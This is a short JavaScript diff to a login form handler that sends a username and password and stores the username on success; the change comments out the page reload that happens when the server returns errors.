@@ -362,8 +362,8 @@ async function form_index(form) {
     let post = USE_DEDICATED ? _User_Pass_single(u, p, TWO_TRY_USER_ACCESS === true && location.href.includes('vry=') === true) : User_Pass_single(u, p, TWO_TRY_USER_ACCESS === true && location.href.includes('vry=') === true);
     let result = USE_DEDICATED ? await load_Send_post_Dedicated(post) : await load_Send_post(post);
     if (Object.keys(result).includes('errors')) {
-        window.location.replace(location.href);
-        window.location.reload();
+        //window.location.replace(location.href);
+        //window.location.reload();
     } else {
         if (result.response.msg.includes("uccessfull")) {
             localStorage.setItem("username", u);
